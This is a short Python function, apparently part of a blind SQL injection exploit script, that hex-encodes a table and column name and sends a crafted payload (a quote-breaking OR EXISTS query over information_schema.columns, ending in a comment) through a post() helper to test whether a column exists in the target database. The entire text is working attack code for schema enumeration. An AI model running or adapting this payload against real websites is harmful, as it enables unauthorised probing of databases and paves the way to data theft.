def has_column(table_name, col_name):
    th = '0x'+table_name.encode().hex()
    ch = '0x'+col_name.encode().hex()
    payload = f'"OR(EXISTS(SELECT(1)FROM(information_schema.columns)HAVING(SUM((table_schema=database())*(table_name={th})*(column_name={ch}))>0)))#'
    return post(payload)

